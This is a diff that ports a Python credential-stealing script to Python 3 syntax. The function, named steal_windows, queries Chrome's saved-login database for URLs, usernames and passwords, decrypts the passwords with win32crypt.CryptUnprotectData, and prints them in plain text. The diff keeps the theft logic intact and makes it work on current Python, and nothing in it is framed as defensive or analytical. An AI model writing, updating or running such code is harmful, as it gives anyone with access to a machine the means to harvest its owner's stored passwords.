@@ -20,20 +20,20 @@ def steal_windows():
 		cursor = conn.cursor()
 		# Whoah an error
 	except:
-		print '[-] Couldn\'t open the database'
+		print('[-] Couldn\'t open the database')
 		return
 	# Execute the query
 	try:
 		cursor.execute('SELECT action_url, username_value, password_value FROM logins WHERE username_value IS NOT \'\' OR password_value IS NOT \'\'')
 	except:
-		print '[-] Error getting the passwords'
+		print('[-] Error getting the passwords')
 		return
 	# Fetch all data
 	data = cursor.fetchall()
 	# Check if there is any data
 	if len(data) > 0:
 		for result in data:
-	  	# Decrypt the Password
+	  		# Decrypt the Password
 	  		try:
 				# The good/bad thing about the Chrome passwords is that they are easily decryptable
 				password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
@@ -46,8 +46,8 @@ def steal_windows():
 				if(len(result[0]) <= 0):
 					result[0] = "(Unknown)"
 				# Print the result
-				print "[+] URL:{url}\nUsername:{user}\nPassword:{pass_}\n".format(url=result[0],user=result[1],pass_=password)
+				print ("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password))
 		return
 	else:
-		print '[-] There are no passwords'
+		print('[-] There are no passwords')
 		return
